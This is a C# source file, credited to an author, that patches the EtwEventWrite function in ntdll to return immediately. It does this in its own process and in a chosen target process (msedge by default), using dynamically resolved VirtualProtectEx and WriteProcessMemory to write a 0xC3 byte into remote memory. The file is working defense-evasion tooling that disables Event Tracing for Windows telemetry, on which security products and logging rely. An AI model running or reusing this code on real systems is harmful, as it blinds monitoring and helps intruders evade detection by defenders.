// Author: Shain Lakin

int GetProcId()
{
    if (args.Length == 0)
    {
        args = new string[] { "msedge" };
    }

    if (args[0].All(char.IsDigit))
    {
        //Console.WriteLine("[+] Getting process ID for target process ({0})", args[0]);
        var pid = int.Parse(args[0]);
        var process = Process.GetProcessById(pid);
        //Console.WriteLine("[+] Handle: {0}\n  [+] Id: {1}", process.Handle, process.Id);
        return process.Id;
    }
    else
    {
        //Console.WriteLine("[+] Getting process ID for target process ({0})", args[0]);
        var name = args[0];
        var process = Process.GetProcessesByName(name).FirstOrDefault();
        //Console.WriteLine("[+] Handle: {0}\n[+] Id: {1}", process.Handle, process.Id);
        return process.Id;
    }
}

//Console.WriteLine("[*] ----- Patching ETW ----- [*]");
int targetProcessId = GetProcId();
Process targetProcess = Process.GetProcessById(targetProcessId);
IntPtr targetProcessHandle = targetProcess.Handle;

Native.VirtualProtectEx VirtualProtectEx;
Native.WriteProcessMemory WriteProcessMemory;

IntPtr vpeAddress = Generic.GetLibraryAddress("kernel32.dll", "VirtualProtectEx");
IntPtr wpmAddress = Generic.GetLibraryAddress("kernel32.dll", "WriteProcessMemory");

VirtualProtectEx =
    (Native.VirtualProtectEx)Marshal.GetDelegateForFunctionPointer(vpeAddress,
        typeof(Native.VirtualProtectEx));
WriteProcessMemory =
    (Native.WriteProcessMemory)Marshal.GetDelegateForFunctionPointer(wpmAddress,
        typeof(Native.WriteProcessMemory));

IntPtr GetRemoteNtdllBaseAddress(Process targetProcess)
{
    var ntdllBaseAddress = targetProcess.Modules.Cast<ProcessModule>()
        .FirstOrDefault(m => m.ModuleName == "ntdll.dll")?.BaseAddress;

    if (ntdllBaseAddress.HasValue)
    {
        return ntdllBaseAddress.Value;
    }
    else
    {
        throw new InvalidOperationException();
    }
}

//Console.WriteLine("[+] NTDLL base address: 0x" + GetRemoteNtdllBaseAddress(targetProcess).ToString("X"));

IntPtr GetEtwEventWriteOffset()
{
    var localNtdllAddress = Generic.GetLibraryAddress("ntdll.dll", "EtwEventWrite");
    var localNtdllBaseAddress = GetRemoteNtdllBaseAddress(Process.GetCurrentProcess());
    var offset = (long)localNtdllAddress - (long)localNtdllBaseAddress;

    return (IntPtr)offset;
}

//Console.WriteLine("[+] ETW decimal offset: {0}", GetEtwEventWriteOffset().ToString());
//Console.WriteLine("[+] ETW hex offset: 0x{0}", GetEtwEventWriteOffset().ToString("X"));

bool checkFlag = false;

void ModifyRemoteMemory(IntPtr processHandle, IntPtr address, byte newValue)
{
    const int PAGE_EXECUTE_READWRITE = 0x40;

    if (VirtualProtectEx(processHandle, address, (UIntPtr)1, PAGE_EXECUTE_READWRITE, out var oldProtect) == 0)
    {
        //throw new InvalidOperationException("[!] Failed to change memory protection.");
    }

    if (WriteProcessMemory(processHandle, address, new[] { newValue }, 1, out _) == 0)
    {
        //throw new InvalidOperationException("[!] Failed to write to the memory.");
    }
    else
    {
        if (checkFlag == false)
        {
            //Console.WriteLine("[+] Patched 0x{0} to 0x{1}", newValue.ToString("X"), address.ToString("X"));
            checkFlag = true;
        }
    }

    if (VirtualProtectEx(processHandle, address, (UIntPtr)1, (int)oldProtect, out _) == 0)
    {
        //throw new InvalidOperationException("[!] Failed to restore memory protection.");
    }
}

void PatchEtw(IntPtr processHandle, IntPtr remoteNtdllBaseAddress)
{
    IntPtr etwEventWriteOffset = GetEtwEventWriteOffset();
    IntPtr remoteEtwEventWriteAddress = (IntPtr)((long)remoteNtdllBaseAddress + (long)etwEventWriteOffset);

    byte newValue = 0xC3; // RET
    ModifyRemoteMemory(processHandle, remoteEtwEventWriteAddress, newValue);
}

Process currentProcess = Process.GetCurrentProcess();
IntPtr currentNtdllBaseAddress = GetRemoteNtdllBaseAddress(currentProcess);
PatchEtw(currentProcess.Handle, currentNtdllBaseAddress);

IntPtr remoteNtdllBaseAddress = GetRemoteNtdllBaseAddress(targetProcess);
PatchEtw(targetProcessHandle, remoteNtdllBaseAddress);